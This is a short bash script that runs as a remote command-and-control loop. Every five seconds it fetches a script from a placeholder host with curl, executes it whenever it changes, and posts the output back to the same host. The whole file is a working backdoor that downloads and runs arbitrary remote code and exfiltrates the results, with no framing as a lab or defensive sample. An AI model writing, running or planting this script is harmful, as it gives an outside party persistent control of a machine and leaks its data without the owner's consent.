prevInstr="no way this would be repeated as the instruction"
pollingIter=0
exeIter=0
while true
do
	pollingIter=$((pollingIter+1))
	echo "Polling iteration"
	echo $pollingIter 
	curl yourSecret.app.com/yourSecretContext > instructions.sh
	instr=`cat instructions.sh`
	if [ "$instr" != "$prevInstr" ]; then
		exeIter=$((exeIter+1))		
		echo "Executing iteration"
		echo $exeIter
		prevInstr=$instr
		chmod +x instructions.sh
		./instructions.sh > answer
		value=`cat answer`
		curl --data "payload=$value" yourSecret.app.com/yourSecretContext > resp
		rm resp
		rm answer
		rm instructions.sh
	fi
	sleep 5
done
